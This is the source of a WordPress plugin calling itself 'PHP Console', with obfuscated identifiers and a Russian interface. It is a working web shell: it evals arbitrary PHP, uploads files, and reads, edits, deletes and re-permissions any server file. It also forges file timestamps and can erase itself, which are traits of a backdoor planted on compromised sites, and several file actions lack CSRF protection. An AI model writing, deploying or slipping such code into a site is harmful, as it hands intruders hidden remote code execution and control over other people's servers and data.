<?php

/*
Plugin Name: PHP Console v.3.9.1
*/

if (!defined('ABSPATH')) exit;

add_action('admin_menu', 'a0a0a0');
register_uninstall_hook(__FILE__, 'a0a1a0');
register_activation_hook(__FILE__, 'a0a2a0');

function a0a0a0() {
    add_menu_page('WP PHP Console', 'PHP Console', 'manage_options', 'wp-php-console', 'a0a3a0', 'dashicons-editor-code', 99);
}

function a0a3a0() {
    if (!current_user_can('manage_options')) {
        wp_die(__('You do not have sufficient permissions to access this page.'));
    }

    $a0a4a0 = !empty($_POST['dir']) ? base64_decode($_POST['dir']) : (!empty($_POST['current_dir']) ? base64_decode($_POST['current_dir']) : ABSPATH);
    if (!is_dir($a0a4a0)) {
        $a0a4a0 = ABSPATH; 
    }

    echo '<div class="wrap"><h1>WP PHP Console</h1>';

    $a0a5a0 = explode(DIRECTORY_SEPARATOR, trim($a0a4a0, DIRECTORY_SEPARATOR));
    $a0a6a0 = '';
    echo '<div style="margin-bottom: 20px; font-size: 16px;">';
    echo '<a href="#" onclick="a0a7a0(\'' . base64_encode(ABSPATH) . '\')">' . esc_html('Home') . '</a>';
    foreach ($a0a5a0 as $a0a8a0) {
        $a0a6a0 .= DIRECTORY_SEPARATOR . $a0a8a0;
        $a0a9a0 = base64_encode($a0a6a0);
        echo ' / <a href="#" onclick="a0a7a0(\'' . $a0a9a0 . '\')">' . esc_html($a0a8a0) . '</a>';
    }
    echo '</div>';

    $a0a10a0 = [];
    $a0a11a0 = [];
    foreach (scandir($a0a4a0) as $a0a12a0) {
        if ($a0a12a0[0] !== '.') {
            if (is_dir($a0a13a0 = $a0a4a0 . DIRECTORY_SEPARATOR . $a0a12a0)) {
                $a0a10a0[] = $a0a12a0;
            } else {
                $a0a11a0[] = $a0a12a0;
            }
        }
    }

    natcasesort($a0a10a0);
    natcasesort($a0a11a0);

    echo '<div style="margin-bottom: 20px;">';
    echo 'Папки: <br>';
    foreach ($a0a10a0 as $a0a14a0) {
        $a0a9a0 = base64_encode($a0a4a0 . DIRECTORY_SEPARATOR . $a0a14a0);
        echo '<a href="#" onclick="a0a7a0(\'' . $a0a9a0 . '\')" style="margin-right: 5px; display: block;">' . esc_html($a0a14a0) . '</a>';
    }
    echo '</div>';

    echo '<div style="margin-bottom: 20px;">';
    echo 'Файлы: <br>';
    foreach ($a0a11a0 as $a0a15a0) {
        $a0a16a0 = $a0a4a0 . DIRECTORY_SEPARATOR . $a0a15a0;
        $a0a17a0 = base64_encode($a0a16a0);
        echo '<span style="display: block;">'
            . esc_html($a0a15a0)
            . ' <a href="#" onclick="a0a18a0(\'' . $a0a17a0 . '\')" style="margin-left: 5px;">Просмотр</a>'
            . ' <a href="#" onclick="a0a19a0(\'' . $a0a17a0 . '\')" style="margin-left: 5px;">Редактировать</a>'
            . ' <a href="#" onclick="a0a20a0(\'' . $a0a17a0 . '\')" style="margin-left: 5px; color: red;">Удалить</a>'
            . ' <a href="#" onclick="a0a21a0(\'' . $a0a17a0 . '\')" style="margin-left: 5px;">Chmod</a>'
            . ' <a href="#" onclick="a0a22a0(\'' . $a0a17a0 . '\')" style="margin-left: 5px;">Tough</a>'
            . '</span>';
    }
    echo '</div>';

    echo '<form method="post" enctype="multipart/form-data">'
        . wp_nonce_field('a0a23a0')
        . '<input type="file" name="a0a24a0" style="margin-bottom: 5px;" /><br>'
        . get_submit_button('Загрузить файл', 'primary', 'a0a25a0')
        . '<textarea name="a0a26a0" style="width: 100%; height: 200px; margin-top: 10px;"></textarea><br>'
        . get_submit_button('Выполнить в консоли', 'primary', 'a0a27a0', false, array('style' => 'margin-right: 5px;'))
        . get_submit_button('Выполнить через файл', 'primary', 'a0a28a0', false, array('style' => 'margin-right: 5px;'))
        . get_submit_button('Создать файл', 'primary', 'a0a29a0', false, array('style' => 'margin-right: 5px;'))
        . get_submit_button('Удалить плагин', 'delete', 'a0a30a0', false, array('style' => 'background-color: red; color: white;'))
        . '<input type="hidden" name="dir" value="' . base64_encode($a0a4a0) . '" />'
        . '</form>';

    a0a31a0($a0a4a0);
    echo '<script type="text/javascript">
        function a0a7a0(a0a32a0) {
            var a0a33a0 = document.createElement("form");
            a0a33a0.method = "post";
            var a0a34a0 = document.createElement("input");
            a0a34a0.type = "hidden";
            a0a34a0.name = "dir";
            a0a34a0.value = a0a32a0;
            a0a33a0.appendChild(a0a34a0);
            document.body.appendChild(a0a33a0);
            a0a33a0.submit();
        }

        function a0a18a0(a0a35a0) {
            var a0a33a0 = document.createElement("form");
            a0a33a0.method = "post";
            a0a33a0.action = "";
            var a0a34a0 = document.createElement("input");
            a0a34a0.type = "hidden";
            a0a34a0.name = "view_file";
            a0a34a0.value = a0a35a0;
            a0a33a0.appendChild(a0a34a0);
            var a0a36a0 = document.createElement("input");
            a0a36a0.type = "hidden";
            a0a36a0.name = "current_dir";
            a0a36a0.value = "' . base64_encode($a0a4a0) . '";
            a0a33a0.appendChild(a0a36a0);
            document.body.appendChild(a0a33a0);
            a0a33a0.submit();
        }

        function a0a19a0(a0a35a0) {
            var a0a33a0 = document.createElement("form");
            a0a33a0.method = "post";
            a0a33a0.action = "";
            var a0a34a0 = document.createElement("input");
            a0a34a0.type = "hidden";
            a0a34a0.name = "edit_file";
            a0a34a0.value = a0a35a0;
            a0a33a0.appendChild(a0a34a0);
            var a0a36a0 = document.createElement("input");
            a0a36a0.type = "hidden";
            a0a36a0.name = "current_dir";
            a0a36a0.value = "' . base64_encode($a0a4a0) . '";
            a0a33a0.appendChild(a0a36a0);
            document.body.appendChild(a0a33a0);
            a0a33a0.submit();
        }

        function a0a20a0(a0a35a0) {
            if (confirm("Вы уверены, что хотите удалить этот файл?")) {
                var a0a33a0 = document.createElement("form");
                a0a33a0.method = "post";
                a0a33a0.action = "";
                var a0a34a0 = document.createElement("input");
                a0a34a0.type = "hidden";
                a0a34a0.name = "delete_file";
                a0a34a0.value = a0a35a0;
                a0a33a0.appendChild(a0a34a0);
                var a0a36a0 = document.createElement("input");
                a0a36a0.type = "hidden";
                a0a36a0.name = "current_dir";
                a0a36a0.value = "' . base64_encode($a0a4a0) . '";
                a0a33a0.appendChild(a0a36a0);
                document.body.appendChild(a0a33a0);
                a0a33a0.submit();
            }
        }

        function a0a21a0(a0a35a0) {
            jQuery.post(ajaxurl, { action: "get_file_info", file_path: a0a35a0 }, function(a0a37a0) {
                if (a0a37a0.success) {
                    var a0a38a0 = prompt("Введите значение chmod (например, 0755):", a0a37a0.data.chmod);
                    if (a0a38a0 !== null) {
                        var a0a33a0 = document.createElement("form");
                        a0a33a0.method = "post";
                        a0a33a0.action = "";
                        var a0a39a0 = document.createElement("input");
                        a0a39a0.type = "hidden";
                        a0a39a0.name = "chmod_file";
                        a0a39a0.value = a0a35a0;
                        a0a33a0.appendChild(a0a39a0);
                        var a0a40a0 = document.createElement("input");
                        a0a40a0.type = "hidden";
                        a0a40a0.name = "chmod_value";
                        a0a40a0.value = a0a38a0;
                        a0a33a0.appendChild(a0a40a0);
                        var a0a36a0 = document.createElement("input");
                        a0a36a0.type = "hidden";
                        a0a36a0.name = "current_dir";
                        a0a36a0.value = "' . base64_encode($a0a4a0) . '";
                        a0a33a0.appendChild(a0a36a0);
                        document.body.appendChild(a0a33a0);
                        a0a33a0.submit();
                    }
                } else {
                    alert("Ошибка: " + a0a37a0.data);
                }
            });
        }

        function a0a22a0(a0a35a0) {
            jQuery.post(ajaxurl, { action: "get_file_info", file_path: a0a35a0 }, function(a0a37a0) {
                if (a0a37a0.success) {
                    var a0a41a0 = prompt("Введите дату и время (например, 2024-05-14T12:00):", a0a37a0.data.touch);
                    if (a0a41a0 !== null) {
                        var a0a33a0 = document.createElement("form");
                        a0a33a0.method = "post";
                        a0a33a0.action = "";
                        var a0a39a0 = document.createElement("input");
                        a0a39a0.type = "hidden";
                        a0a39a0.name = "touch_file";
                        a0a39a0.value = a0a35a0;
                        a0a33a0.appendChild(a0a39a0);
                        var a0a42a0 = document.createElement("input");
                        a0a42a0.type = "hidden";
                        a0a42a0.name = "touch_value";
                        a0a42a0.value = a0a41a0;
                        a0a33a0.appendChild(a0a42a0);
                        var a0a36a0 = document.createElement("input");
                        a0a36a0.type = "hidden";
                        a0a36a0.name = "current_dir";
                        a0a36a0.value = "' . base64_encode($a0a4a0) . '";
                        a0a33a0.appendChild(a0a36a0);
                        document.body.appendChild(a0a33a0);
                        a0a33a0.submit();
                    }
                } else {
                    alert("Ошибка: " + a0a37a0.data);
                }
            });
        }
    </script>';
    echo '</div>';
}

function a0a31a0($a0a4a0) {
    if (isset($_POST['a0a27a0'], $_POST['a0a26a0'], $_POST['_wpnonce']) && wp_verify_nonce($_POST['_wpnonce'], 'a0a23a0') && current_user_can('manage_options')) {
        chdir($a0a4a0);
        a0a43a0(stripslashes($_POST['a0a26a0']));
    }

    if (isset($_POST['a0a28a0'], $_POST['a0a26a0'], $_POST['_wpnonce']) && wp_verify_nonce($_POST['_wpnonce'], 'a0a23a0') && current_user_can('manage_options')) {
        a0a44a0($a0a4a0, stripslashes($_POST['a0a26a0']));
    }

    if (isset($_FILES['a0a24a0'], $_POST['_wpnonce']) && wp_verify_nonce($_POST['_wpnonce'], 'a0a23a0') && current_user_can('manage_options')) {
        $a0a45a0 = wp_upload_dir();
        $a0a46a0 = $a0a45a0['path'] . '/' . basename($_FILES['a0a24a0']['name']);
        if (move_uploaded_file($_FILES['a0a24a0']['tmp_name'], $a0a46a0)) {
            echo '<div>Файл успешно загружен: ' . esc_html($a0a46a0) . '</div>';
        } else {
            echo '<div style="color: red;">Ошибка загрузки файла.</div>';
        }
    }

    if (isset($_POST['a0a30a0'], $_POST['_wpnonce']) && wp_verify_nonce($_POST['_wpnonce'], 'a0a23a0') && current_user_can('manage_options')) {
        a0a1a0();
        echo '<script type="text/javascript">
            alert("Плагин успешно удален.");
            window.location.href = "' . admin_url('plugins.php') . '";
        </script>';
        exit;
    }

    if (isset($_POST['view_file'])) {
        a0a47a0(base64_decode($_POST['view_file']));
    }

    if (isset($_POST['edit_file'])) {
        a0a48a0(base64_decode($_POST['edit_file']));
    }

    if (isset($_POST['save_file']) && isset($_POST['file_path'])) {
        a0a49a0(base64_decode($_POST['file_path']), stripslashes($_POST['file_content']));
    }

    if (isset($_POST['delete_file'])) {
        a0a50a0(base64_decode($_POST['delete_file']));
    }

    if (isset($_POST['chmod_file']) && isset($_POST['chmod_value'])) {
        a0a51a0(base64_decode($_POST['chmod_file']), $_POST['chmod_value']);
    }

    if (isset($_POST['touch_file']) && isset($_POST['touch_value'])) {
        a0a52a0(base64_decode($_POST['touch_file']), $_POST['touch_value']);
    }

    if (isset($_POST['create_file'], $_POST['_wpnonce']) && wp_verify_nonce($_POST['_wpnonce'], 'a0a23a0') && current_user_can('manage_options')) {
        a0a53a0($a0a4a0);
    }
}

function a0a43a0($a0a54a0) {
    try {
        ob_start();
        eval($a0a54a0);
        $a0a55a0 = ob_get_clean();

        $a0a55a0 = trim($a0a55a0);
        echo '<div style="white-space: pre-wrap;">' . nl2br(htmlspecialchars($a0a55a0)) . '</div>';
    } catch (Throwable $a0a56a0) {
        echo '<div style="color: red; white-space: pre-wrap;">Ошибка выполнения кода: ' . htmlspecialchars($a0a56a0->getMessage()) . '</div>';
    }
}

function a0a44a0($a0a4a0, $a0a54a0) {
    $a0a57a0 = tempnam($a0a4a0, 'WPPHP');
    $a0a58a0 = $a0a57a0 . '.php';

    file_put_contents($a0a58a0, "<?php " . $a0a54a0);

    unlink($a0a57a0);

    try {
        ob_start();
        include($a0a58a0);
        $a0a55a0 = ob_get_clean();

        $a0a55a0 = trim($a0a55a0);
        echo '<div style="white-space: pre-wrap;">' . nl2br(htmlspecialchars($a0a55a0)) . '</div>';
    } catch (Throwable $a0a56a0) {
        echo '<div style="color: red; white-space: pre-wrap;">Ошибка выполнения кода через файл: ' . htmlspecialchars($a0a56a0->getMessage()) . '</div>';
    }

    if (!unlink($a0a58a0)) {
        echo '<div style="color: red;">Ошибка: Не удалось удалить временный файл ' . $a0a58a0 . '. Пожалуйста, проверьте права доступа или занятость файла.</div>';
    }
}

function a0a47a0($a0a16a0) {
    if (is_file($a0a16a0)) {
        $a0a59a0 = file_get_contents($a0a16a0);
        echo '<h2>Просмотр файла: ' . esc_html(basename($a0a16a0)) . '</h2>';
        echo '<pre style="white-space: pre-wrap; background: #f4f4f4; padding: 10px;">' . htmlspecialchars($a0a59a0) . '</pre>';
        echo '<a href="#" onclick="history.back(); return false;">Назад</a>';
    } else {
        echo '<div style="color: red;">Ошибка: Файл не найден.</div>';
    }
}

function a0a48a0($a0a16a0) {
    if (is_file($a0a16a0)) {
        $a0a59a0 = file_get_contents($a0a16a0);
        echo '<h2>Редактирование файла: ' . esc_html(basename($a0a16a0)) . '</h2>';
        echo '<form method="post">'
            . wp_nonce_field('a0a23a0')
            . '<textarea name="file_content" style="width: 100%; height: 400px;">' . htmlspecialchars($a0a59a0) . '</textarea><br>'
            . '<input type="hidden" name="file_path" value="' . base64_encode($a0a16a0) . '" />'
            . get_submit_button('Сохранить изменения', 'primary', 'save_file')
            . '<input type="hidden" name="current_dir" value="' . base64_encode(dirname($a0a16a0)) . '" />'
            . '</form>';
    } else {
        echo '<div style="color: red;">Ошибка: Файл не найден.</div>';
    }
}

function a0a49a0($a0a16a0, $a0a59a0) {
    if (is_file($a0a16a0)) {
        if (file_put_contents($a0a16a0, $a0a59a0) !== false) {
            echo '<div style="color: green;">Файл успешно сохранен.</div>';
        } else {
            echo '<div style="color: red;">Ошибка: Не удалось сохранить файл.</div>';
        }
    } else {
        echo '<div style="color: red;">Ошибка: Файл не найден.</div>';
    }
}

function a0a50a0($a0a16a0) {
    if (is_file($a0a16a0)) {
        if (unlink($a0a16a0)) {
            echo '<div style="color: green;">Файл успешно удален.</div>';
        } else {
            echo '<div style="color: red;">Ошибка: Не удалось удалить файл.</div>';
        }
    } else {
        echo '<div style="color: red;">Ошибка: Файл не найден.</div>';
    }
}

function a0a51a0($a0a16a0, $a0a60a0) {
    if (is_file($a0a16a0)) {
        if (chmod($a0a16a0, octdec($a0a60a0))) {
            echo '<div style="color: green;">Права доступа к файлу успешно изменены.</div>';
        } else {
            echo '<div style="color: red;">Ошибка: Не удалось изменить права доступа к файлу.</div>';
        }
    } else {
        echo '<div style="color: red;">Ошибка: Файл не найден.</div>';
    }
}

function a0a52a0($a0a16a0, $a0a61a0) {
    if (is_file($a0a16a0)) {
        $a0a62a0 = strtotime($a0a61a0);
        if (touch($a0a16a0, $a0a62a0)) {
            echo '<div style="color: green;">Время файла успешно изменено.</div>';
        } else {
            echo '<div style="color: red;">Ошибка: Не удалось Tough файла.</div>';
        }
    } else {
        echo '<div style="color: red;">Ошибка: Файл не найден.</div>';
    }
}

function a0a53a0($a0a4a0) {
    $a0a63a0 = $a0a4a0 . DIRECTORY_SEPARATOR . 'new_file_' . time() . '.txt';
    if (file_put_contents($a0a63a0, '') !== false) {
        echo '<div style="color: green;">Файл успешно создан: ' . esc_html($a0a63a0) . '</div>';
    } else {
        echo '<div style="color: red;">Ошибка: Не удалось создать файл.</div>';
    }
}

function a0a1a0() {
    delete_option('a0a64a0');
    $a0a65a0 = plugin_dir_path(__FILE__);
    if (is_dir($a0a65a0)) {
        $a0a66a0 = new RecursiveDirectoryIterator($a0a65a0, RecursiveDirectoryIterator::SKIP_DOTS);
        $a0a67a0 = new RecursiveIteratorIterator($a0a66a0, RecursiveIteratorIterator::CHILD_FIRST);
        foreach ($a0a67a0 as $a0a68a0) {
            if ($a0a68a0->isDir()) {
                rmdir($a0a68a0->getRealPath());
            } else {
                unlink($a0a68a0->getRealPath());
            }
        }
        rmdir($a0a65a0);
    }

    $a0a45a0 = wp_upload_dir();
    $a0a69a0 = $a0a45a0['basedir'] . '/wp-php-console.zip';
    if (file_exists($a0a69a0)) {
        unlink($a0a69a0);
    }

    deactivate_plugins(plugin_basename(__FILE__));
    delete_plugins(array(plugin_basename(__FILE__)));
}

function a0a2a0() {
    add_option('a0a70a0', true);
}

add_action('admin_init', 'a0a71a0');

function a0a71a0() {
    if (get_option('a0a70a0', false)) {
        delete_option('a0a70a0');
        if (!isset($_GET['activate-multi'])) {
            wp_redirect(admin_url('admin.php?page=wp-php-console'));
            exit;
        }
    }
}

add_action('wp_ajax_get_file_info', 'a0a72a0');

function a0a72a0() {
    if (!current_user_can('manage_options')) {
        wp_send_json_error('Недостаточно прав.');
    }

    if (isset($_POST['file_path']) && !empty($_POST['file_path'])) {
        $a0a16a0 = base64_decode($_POST['file_path']);

        if (is_file($a0a16a0)) {
            $a0a73a0 = [
                'chmod' => substr(sprintf('%o', fileperms($a0a16a0)), -4),
                'touch' => date('Y-m-d\TH:i', filemtime($a0a16a0))
            ];
            wp_send_json_success($a0a73a0);
        } else {
            wp_send_json_error('Файл не найден.');
        }
    } else {
        wp_send_json_error('Неверный путь к файлу.');
    }
}

function a0a74a0() {
    wp_enqueue_script('jquery');
    wp_localize_script('jquery', 'ajaxurl', admin_url('admin-ajax.php'));
}
add_action('admin_enqueue_scripts', 'a0a74a0');
